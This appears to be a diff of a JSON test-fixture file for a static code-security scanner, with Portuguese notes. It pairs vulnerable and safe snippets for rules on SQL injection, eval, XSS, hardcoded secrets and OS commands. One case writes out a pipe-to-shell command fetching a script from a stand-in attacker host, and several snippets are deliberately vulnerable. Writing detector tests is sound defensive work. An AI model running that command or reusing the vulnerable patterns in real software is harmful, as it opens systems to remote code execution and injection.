@@ -1,131 +1,395 @@
 [
-  { "id": "secret-01", "ruleId": "HERO-SEC-0798-hardcoded-secret", "expected": "match",
-    "code": "API_KEY = \"sk_live_9f8a7b6c5d4e3f2a1b0c9d8e\"" },
-  { "id": "secret-02", "ruleId": "HERO-SEC-0798-hardcoded-secret", "expected": "match",
-    "code": "password: \"Sup3rSecretPass123!\"" },
-  { "id": "secret-03", "ruleId": "HERO-SEC-0798-hardcoded-secret", "expected": "no_match",
-    "code": "api_key = process.env.API_KEY", "note": "credencial lida de env var" },
-  { "id": "secret-04", "ruleId": "HERO-SEC-0798-hardcoded-secret", "expected": "no_match",
-    "code": "password = os.environ[\"DB_PASSWORD\"]", "note": "credencial lida de env var" },
-  { "id": "secret-05", "ruleId": "HERO-SEC-0798-hardcoded-secret", "expected": "no_match",
+  {
+    "id": "secret-01",
+    "ruleId": "HERO-SEC-0798-hardcoded-secret",
+    "expected": "match",
+    "code": "API_KEY = \"sk_live_9f8a7b6c5d4e3f2a1b0c9d8e\""
+  },
+  {
+    "id": "secret-02",
+    "ruleId": "HERO-SEC-0798-hardcoded-secret",
+    "expected": "match",
+    "code": "password: \"Sup3rSecretPass123!\""
+  },
+  {
+    "id": "secret-03",
+    "ruleId": "HERO-SEC-0798-hardcoded-secret",
+    "expected": "no_match",
+    "code": "api_key = process.env.API_KEY",
+    "note": "credencial lida de env var"
+  },
+  {
+    "id": "secret-04",
+    "ruleId": "HERO-SEC-0798-hardcoded-secret",
+    "expected": "no_match",
+    "code": "password = os.environ[\"DB_PASSWORD\"]",
+    "note": "credencial lida de env var"
+  },
+  {
+    "id": "secret-05",
+    "ruleId": "HERO-SEC-0798-hardcoded-secret",
+    "expected": "no_match",
     "code": "token = \"dummy_sample_token_1234567890\"",
-    "note": "FALSO POSITIVO conhecido na regra atual: token fictício de fixture de teste, não coberto pelo unless vigente" },
-
-  { "id": "sqli-01", "ruleId": "HERO-SEC-0089-sql-injection", "expected": "match",
-    "code": "cursor.execute(\"SELECT * FROM users WHERE name = '\" + name + \"'\")" },
-  { "id": "sqli-02", "ruleId": "HERO-SEC-0089-sql-injection", "expected": "match",
-    "code": "db.query(`SELECT * FROM orders WHERE id = ${orderId}`)" },
-  { "id": "sqli-03", "ruleId": "HERO-SEC-0089-sql-injection", "expected": "no_match",
-    "code": "cursor.execute(\"SELECT * FROM users WHERE name = ?\", (name,))", "note": "query parametrizada segura" },
-  { "id": "sqli-04", "ruleId": "HERO-SEC-0089-sql-injection", "expected": "no_match",
-    "code": "cursor.execute(\"SELECT * FROM users\")" },
-
-  { "id": "hash-01", "ruleId": "HERO-SEC-0327-weak-hash", "expected": "match",
-    "code": "digest = hashlib.md5(data).hexdigest()" },
-  { "id": "hash-02", "ruleId": "HERO-SEC-0327-weak-hash", "expected": "match",
+    "note": "FALSO POSITIVO conhecido na regra atual: token fictício de fixture de teste, não coberto pelo unless vigente"
+  },
+  {
+    "id": "sqli-01",
+    "ruleId": "HERO-SEC-0089-sql-injection",
+    "expected": "match",
+    "code": "cursor.execute(\"SELECT * FROM users WHERE name = '\" + name + \"'\")"
+  },
+  {
+    "id": "sqli-02",
+    "ruleId": "HERO-SEC-0089-sql-injection",
+    "expected": "match",
+    "code": "db.query(`SELECT * FROM orders WHERE id = ${orderId}`)"
+  },
+  {
+    "id": "sqli-03",
+    "ruleId": "HERO-SEC-0089-sql-injection",
+    "expected": "no_match",
+    "code": "cursor.execute(\"SELECT * FROM users WHERE name = ?\", (name,))",
+    "note": "query parametrizada segura"
+  },
+  {
+    "id": "sqli-04",
+    "ruleId": "HERO-SEC-0089-sql-injection",
+    "expected": "no_match",
+    "code": "cursor.execute(\"SELECT * FROM users\")"
+  },
+  {
+    "id": "hash-01",
+    "ruleId": "HERO-SEC-0327-weak-hash",
+    "expected": "match",
+    "code": "digest = hashlib.md5(data).hexdigest()"
+  },
+  {
+    "id": "hash-02",
+    "ruleId": "HERO-SEC-0327-weak-hash",
+    "expected": "match",
     "code": "h = hashlib.new('md5')",
-    "note": "FALSO NEGATIVO conhecido na regra atual: forma alternativa hashlib.new(...) não é capturada pelo regex vigente" },
-  { "id": "hash-03", "ruleId": "HERO-SEC-0327-weak-hash", "expected": "no_match",
-    "code": "digest = hashlib.sha256(data).hexdigest()", "note": "hash forte, não deve disparar" },
-  { "id": "hash-04", "ruleId": "HERO-SEC-0327-weak-hash", "expected": "no_match",
-    "code": "value = row['md5_checksum']", "note": "nome de campo contendo md5, não é uma chamada de hash" },
-
-  { "id": "eval-01", "ruleId": "HERO-SEC-0095-code-injection-eval", "expected": "match",
-    "code": "return eval(payload)" },
-  { "id": "eval-02", "ruleId": "HERO-SEC-0095-code-injection-eval", "expected": "match",
-    "code": "exec(user_input)" },
-  { "id": "eval-03", "ruleId": "HERO-SEC-0095-code-injection-eval", "expected": "no_match",
-    "code": "result = safe_eval(payload)", "note": "função com sufixo _eval, não é o builtin perigoso" },
-  { "id": "eval-04", "ruleId": "HERO-SEC-0095-code-injection-eval", "expected": "no_match",
-    "code": "eval(x)  # eslint-disable-line no-eval", "note": "suprimido explicitamente" },
-
-  { "id": "debug-01", "ruleId": "HERO-SMELL-0489-debug-statement", "expected": "match",
-    "code": "print(\"running\")" },
-  { "id": "debug-02", "ruleId": "HERO-SMELL-0489-debug-statement", "expected": "match",
-    "code": "console.log(\"debug info\")" },
-  { "id": "debug-03", "ruleId": "HERO-SMELL-0489-debug-statement", "expected": "no_match",
-    "code": "logger.info(\"state changed\")" },
-  { "id": "debug-04", "ruleId": "HERO-SMELL-0489-debug-statement", "expected": "no_match",
-    "code": "pretty_print(data)", "note": "função com prefixo, não é o builtin print" },
-
-  { "id": "todo-01", "ruleId": "HERO-SMELL-0546-todo-marker", "expected": "match",
-    "code": "# TODO: add pagination" },
-  { "id": "todo-02", "ruleId": "HERO-SMELL-0546-todo-marker", "expected": "match",
-    "code": "// FIXME: handle null case" },
-  { "id": "todo-03", "ruleId": "HERO-SMELL-0546-todo-marker", "expected": "no_match",
-    "code": "todo_list = []", "note": "identificador contendo 'todo', não é um comentário-marcador" },
-
-  { "id": "tsql-01", "ruleId": "HERO-SEC-0089-dynamic-sql-tsql", "expected": "match",
-    "code": "SET @sql = 'SELECT * FROM Customers WHERE Name = ''' + @CustomerName + '''';" },
-  { "id": "tsql-02", "ruleId": "HERO-SEC-0089-dynamic-sql-tsql", "expected": "no_match",
+    "note": "FALSO NEGATIVO conhecido na regra atual: forma alternativa hashlib.new(...) não é capturada pelo regex vigente"
+  },
+  {
+    "id": "hash-03",
+    "ruleId": "HERO-SEC-0327-weak-hash",
+    "expected": "no_match",
+    "code": "digest = hashlib.sha256(data).hexdigest()",
+    "note": "hash forte, não deve disparar"
+  },
+  {
+    "id": "hash-04",
+    "ruleId": "HERO-SEC-0327-weak-hash",
+    "expected": "no_match",
+    "code": "value = row['md5_checksum']",
+    "note": "nome de campo contendo md5, não é uma chamada de hash"
+  },
+  {
+    "id": "eval-01",
+    "ruleId": "HERO-SEC-0095-code-injection-eval",
+    "expected": "match",
+    "code": "return eval(payload)"
+  },
+  {
+    "id": "eval-02",
+    "ruleId": "HERO-SEC-0095-code-injection-eval",
+    "expected": "match",
+    "code": "exec(user_input)"
+  },
+  {
+    "id": "eval-03",
+    "ruleId": "HERO-SEC-0095-code-injection-eval",
+    "expected": "no_match",
+    "code": "result = safe_eval(payload)",
+    "note": "função com sufixo _eval, não é o builtin perigoso"
+  },
+  {
+    "id": "eval-04",
+    "ruleId": "HERO-SEC-0095-code-injection-eval",
+    "expected": "no_match",
+    "code": "eval(x)  # eslint-disable-line no-eval",
+    "note": "suprimido explicitamente"
+  },
+  {
+    "id": "debug-01",
+    "ruleId": "HERO-SMELL-0489-debug-statement",
+    "expected": "match",
+    "code": "print(\"running\")"
+  },
+  {
+    "id": "debug-02",
+    "ruleId": "HERO-SMELL-0489-debug-statement",
+    "expected": "match",
+    "code": "console.log(\"debug info\")"
+  },
+  {
+    "id": "debug-03",
+    "ruleId": "HERO-SMELL-0489-debug-statement",
+    "expected": "no_match",
+    "code": "logger.info(\"state changed\")"
+  },
+  {
+    "id": "debug-04",
+    "ruleId": "HERO-SMELL-0489-debug-statement",
+    "expected": "no_match",
+    "code": "pretty_print(data)",
+    "note": "função com prefixo, não é o builtin print"
+  },
+  {
+    "id": "todo-01",
+    "ruleId": "HERO-SMELL-0546-todo-marker",
+    "expected": "match",
+    "code": "# TODO: add pagination"
+  },
+  {
+    "id": "todo-02",
+    "ruleId": "HERO-SMELL-0546-todo-marker",
+    "expected": "match",
+    "code": "// FIXME: handle null case"
+  },
+  {
+    "id": "todo-03",
+    "ruleId": "HERO-SMELL-0546-todo-marker",
+    "expected": "no_match",
+    "code": "todo_list = []",
+    "note": "identificador contendo 'todo', não é um comentário-marcador"
+  },
+  {
+    "id": "tsql-01",
+    "ruleId": "HERO-SEC-0089-dynamic-sql-tsql",
+    "expected": "match",
+    "code": "SET @sql = 'SELECT * FROM Customers WHERE Name = ''' + @CustomerName + '''';"
+  },
+  {
+    "id": "tsql-02",
+    "ruleId": "HERO-SEC-0089-dynamic-sql-tsql",
+    "expected": "no_match",
     "code": "EXEC sp_executesql N'SELECT * FROM Customers WHERE Name = @Name', N'@Name NVARCHAR(100)', @Name = @CustomerName;",
-    "note": "sp_executesql parametrizado, sem concatenação" },
-
-  { "id": "csharp-01", "ruleId": "HERO-SEC-0089-adonet-sqli", "expected": "match",
-    "code": "var cmd = new SqlCommand(\"SELECT * FROM Customers WHERE Name = '\" + name + \"'\");" },
-  { "id": "csharp-02", "ruleId": "HERO-SEC-0089-adonet-sqli", "expected": "no_match",
+    "note": "sp_executesql parametrizado, sem concatenação"
+  },
+  {
+    "id": "csharp-01",
+    "ruleId": "HERO-SEC-0089-adonet-sqli",
+    "expected": "match",
+    "code": "var cmd = new SqlCommand(\"SELECT * FROM Customers WHERE Name = '\" + name + \"'\");"
+  },
+  {
+    "id": "csharp-02",
+    "ruleId": "HERO-SEC-0089-adonet-sqli",
+    "expected": "no_match",
     "code": "var cmd = new SqlCommand(\"SELECT * FROM Customers WHERE Id = @id\", conn);",
-    "note": "query parametrizada via @id" },
-
-  { "id": "cobol-secret-01", "ruleId": "HERO-SEC-0798-cobol-hardcoded-secret", "expected": "match",
-    "code": "MOVE 'PROD_DB2_PASSWORD_2024' TO WS-DB-PASSWORD" },
-  { "id": "cobol-secret-02", "ruleId": "HERO-SEC-0798-cobol-hardcoded-secret", "expected": "no_match",
-    "code": "MOVE 'JOHN SMITH SILVA' TO WS-CUSTOMER-NAME", "note": "campo não relacionado a credencial" },
-
-  { "id": "cobol-goto-01", "ruleId": "HERO-SMELL-0goto-cobol", "expected": "match",
-    "code": "GO TO ERROR-PARA" },
-  { "id": "cobol-goto-02", "ruleId": "HERO-SMELL-0goto-cobol", "expected": "no_match",
-    "code": "GO TO.", "note": "GO TO isolado ao fim de parágrafo é idiomático em COBOL, não um salto real" },
-
-  { "id": "xss-01", "ruleId": "HERO-SEC-0079-xss-sink", "expected": "match",
-    "code": "el.innerHTML = userHtml" },
-  { "id": "xss-02", "ruleId": "HERO-SEC-0079-xss-sink", "expected": "no_match",
-    "code": "el.innerHTML = DOMPurify.sanitize(userHtml)", "note": "sanitizado" },
-  { "id": "xss-03", "ruleId": "HERO-SEC-0079-xss-sink", "expected": "no_match",
-    "code": "el.textContent = userHtml", "note": "sink seguro" },
-
-  { "id": "cmd-01", "ruleId": "HERO-SEC-0078-os-command", "expected": "match",
-    "code": "exec(userCmd)" },
-  { "id": "cmd-02", "ruleId": "HERO-SEC-0078-os-command", "expected": "no_match",
-    "code": "spawn(bin, args, { shell: false })", "note": "shell desligado" },
-
-  { "id": "ssrf-01", "ruleId": "HERO-SEC-0918-ssrf", "expected": "match",
-    "code": "fetch(`/proxy?url=${target}`)" },
-  { "id": "ssrf-02", "ruleId": "HERO-SEC-0918-ssrf", "expected": "no_match",
-    "code": "fetch('https://api.example.com/health')", "note": "URL estática" },
-
-  { "id": "path-01", "ruleId": "HERO-SEC-0022-path-traversal", "expected": "match",
-    "code": "fs.readFile(path.join(BASE, req.params.file))" },
-  { "id": "path-02", "ruleId": "HERO-SEC-0022-path-traversal", "expected": "no_match",
-    "code": "fs.readFile(path.join(BASE, 'readme.txt'))", "note": "path estático" },
-
-  { "id": "redir-01", "ruleId": "HERO-SEC-0601-open-redirect", "expected": "match",
-    "code": "res.redirect(`/next?u=${req.query.url}`)" },
-  { "id": "redir-02", "ruleId": "HERO-SEC-0601-open-redirect", "expected": "no_match",
-    "code": "res.redirect('/home')", "note": "path relativo fixo" },
-
-  { "id": "proto-01", "ruleId": "HERO-SEC-1321-prototype-pollution", "expected": "match",
-    "code": "Object.assign(cfg, req.body)" },
-  { "id": "proto-02", "ruleId": "HERO-SEC-1321-prototype-pollution", "expected": "no_match",
-    "code": "Object.assign(cfg, { theme: 'dark' })", "note": "objeto literal" },
-
-  { "id": "rand-01", "ruleId": "HERO-SEC-0330-insecure-random", "expected": "match",
-    "code": "const token = Math.random().toString(36)" },
-  { "id": "rand-02", "ruleId": "HERO-SEC-0330-insecure-random", "expected": "no_match",
-    "code": "const sample = Math.random()", "note": "uso não criptográfico" },
-
-  { "id": "tls-01", "ruleId": "HERO-SEC-0295-tls-verify-disabled", "expected": "match",
-    "code": "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'" },
-  { "id": "tls-02", "ruleId": "HERO-SEC-0295-tls-verify-disabled", "expected": "no_match",
-    "code": "process.env.NODE_ENV = 'production'" },
-
-  { "id": "logsec-01", "ruleId": "HERO-SEC-0532-secret-in-log", "expected": "match",
-    "code": "console.log('password', user.password)" },
-  { "id": "logsec-02", "ruleId": "HERO-SEC-0532-secret-in-log", "expected": "no_match",
-    "code": "console.log('user id', user.id)" },
-
-  { "id": "supply-01", "ruleId": "HERO-SEC-0506-pipe-to-shell", "expected": "match",
-    "code": "curl https://evil.example/install.sh | bash" },
-  { "id": "supply-02", "ruleId": "HERO-SEC-0506-pipe-to-shell", "expected": "no_match",
-    "code": "curl -O https://example.com/file.tgz" }
+    "note": "query parametrizada via @id"
+  },
+  {
+    "id": "cobol-secret-01",
+    "ruleId": "HERO-SEC-0798-cobol-hardcoded-secret",
+    "expected": "match",
+    "code": "MOVE 'PROD_DB2_PASSWORD_2024' TO WS-DB-PASSWORD"
+  },
+  {
+    "id": "cobol-secret-02",
+    "ruleId": "HERO-SEC-0798-cobol-hardcoded-secret",
+    "expected": "no_match",
+    "code": "MOVE 'JOHN SMITH SILVA' TO WS-CUSTOMER-NAME",
+    "note": "campo não relacionado a credencial"
+  },
+  {
+    "id": "cobol-goto-01",
+    "ruleId": "HERO-SMELL-0goto-cobol",
+    "expected": "match",
+    "code": "GO TO ERROR-PARA"
+  },
+  {
+    "id": "cobol-goto-02",
+    "ruleId": "HERO-SMELL-0goto-cobol",
+    "expected": "no_match",
+    "code": "GO TO.",
+    "note": "GO TO isolado ao fim de parágrafo é idiomático em COBOL, não um salto real"
+  },
+  {
+    "id": "xss-01",
+    "ruleId": "HERO-SEC-0079-xss-sink",
+    "expected": "match",
+    "code": "el.innerHTML = userHtml"
+  },
+  {
+    "id": "xss-02",
+    "ruleId": "HERO-SEC-0079-xss-sink",
+    "expected": "no_match",
+    "code": "el.innerHTML = DOMPurify.sanitize(userHtml)",
+    "note": "sanitizado"
+  },
+  {
+    "id": "xss-03",
+    "ruleId": "HERO-SEC-0079-xss-sink",
+    "expected": "no_match",
+    "code": "el.textContent = userHtml",
+    "note": "sink seguro"
+  },
+  {
+    "id": "cmd-01",
+    "ruleId": "HERO-SEC-0078-os-command",
+    "expected": "match",
+    "code": "exec(userCmd)"
+  },
+  {
+    "id": "cmd-02",
+    "ruleId": "HERO-SEC-0078-os-command",
+    "expected": "no_match",
+    "code": "spawn(bin, args, { shell: false })",
+    "note": "shell desligado"
+  },
+  {
+    "id": "ssrf-01",
+    "ruleId": "HERO-SEC-0918-ssrf",
+    "expected": "match",
+    "code": "fetch(`/proxy?url=${target}`)"
+  },
+  {
+    "id": "ssrf-02",
+    "ruleId": "HERO-SEC-0918-ssrf",
+    "expected": "no_match",
+    "code": "fetch('https://api.example.com/health')",
+    "note": "URL estática"
+  },
+  {
+    "id": "path-01",
+    "ruleId": "HERO-SEC-0022-path-traversal",
+    "expected": "match",
+    "code": "fs.readFile(path.join(BASE, req.params.file))"
+  },
+  {
+    "id": "path-02",
+    "ruleId": "HERO-SEC-0022-path-traversal",
+    "expected": "no_match",
+    "code": "fs.readFile(path.join(BASE, 'readme.txt'))",
+    "note": "path estático"
+  },
+  {
+    "id": "redir-01",
+    "ruleId": "HERO-SEC-0601-open-redirect",
+    "expected": "match",
+    "code": "res.redirect(`/next?u=${req.query.url}`)"
+  },
+  {
+    "id": "redir-02",
+    "ruleId": "HERO-SEC-0601-open-redirect",
+    "expected": "no_match",
+    "code": "res.redirect('/home')",
+    "note": "path relativo fixo"
+  },
+  {
+    "id": "proto-01",
+    "ruleId": "HERO-SEC-1321-prototype-pollution",
+    "expected": "match",
+    "code": "Object.assign(cfg, req.body)"
+  },
+  {
+    "id": "proto-02",
+    "ruleId": "HERO-SEC-1321-prototype-pollution",
+    "expected": "no_match",
+    "code": "Object.assign(cfg, { theme: 'dark' })",
+    "note": "objeto literal"
+  },
+  {
+    "id": "rand-01",
+    "ruleId": "HERO-SEC-0330-insecure-random",
+    "expected": "match",
+    "code": "const token = Math.random().toString(36)"
+  },
+  {
+    "id": "rand-02",
+    "ruleId": "HERO-SEC-0330-insecure-random",
+    "expected": "no_match",
+    "code": "const sample = Math.random()",
+    "note": "uso não criptográfico"
+  },
+  {
+    "id": "tls-01",
+    "ruleId": "HERO-SEC-0295-tls-verify-disabled",
+    "expected": "match",
+    "code": "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'"
+  },
+  {
+    "id": "tls-02",
+    "ruleId": "HERO-SEC-0295-tls-verify-disabled",
+    "expected": "no_match",
+    "code": "process.env.NODE_ENV = 'production'"
+  },
+  {
+    "id": "logsec-01",
+    "ruleId": "HERO-SEC-0532-secret-in-log",
+    "expected": "match",
+    "code": "console.log('password', user.password)"
+  },
+  {
+    "id": "logsec-02",
+    "ruleId": "HERO-SEC-0532-secret-in-log",
+    "expected": "no_match",
+    "code": "console.log('user id', user.id)"
+  },
+  {
+    "id": "supply-01",
+    "ruleId": "HERO-SEC-0506-pipe-to-shell",
+    "expected": "match",
+    "code": "curl https://evil.example/install.sh | bash"
+  },
+  {
+    "id": "supply-02",
+    "ruleId": "HERO-SEC-0506-pipe-to-shell",
+    "expected": "no_match",
+    "code": "curl -O https://example.com/file.tgz"
+  },
+  {
+    "id": "os-02",
+    "ruleId": "HERO-SEC-0078-os-command",
+    "expected": "match",
+    "code": "exec(req.query.cmd);"
+  },
+  {
+    "id": "os-03",
+    "ruleId": "HERO-SEC-0078-os-command",
+    "expected": "match",
+    "code": "const out = execSync(\"git ls-files\");"
+  },
+  {
+    "id": "os-04",
+    "ruleId": "HERO-SEC-0078-os-command",
+    "expected": "match",
+    "code": "child_process.exec(cmd)"
+  },
+  {
+    "id": "os-05",
+    "ruleId": "HERO-SEC-0078-os-command",
+    "expected": "match",
+    "code": "cp.spawn(bin, args)"
+  },
+  {
+    "id": "os-08",
+    "ruleId": "HERO-SEC-0078-os-command",
+    "expected": "no_match",
+    "code": "const m = re.exec(line);",
+    "note": "RegExp.prototype.exec, nao child_process"
+  },
+  {
+    "id": "os-09",
+    "ruleId": "HERO-SEC-0078-os-command",
+    "expected": "no_match",
+    "code": "const inline = /^\\(\\?([a-z]+)\\)/.exec(body);",
+    "note": "exec de literal de regex"
+  },
+  {
+    "id": "os-10",
+    "ruleId": "HERO-SEC-0078-os-command",
+    "expected": "no_match",
+    "code": "  // com um `EXEC(@sql)` em linha separada",
+    "note": "mencao em comentario"
+  },
+  {
+    "id": "os-11",
+    "ruleId": "HERO-SEC-0078-os-command",
+    "expected": "no_match",
+    "code": "const parts = pattern.exec(input);",
+    "note": "RegExp.prototype.exec"
+  }
 ]
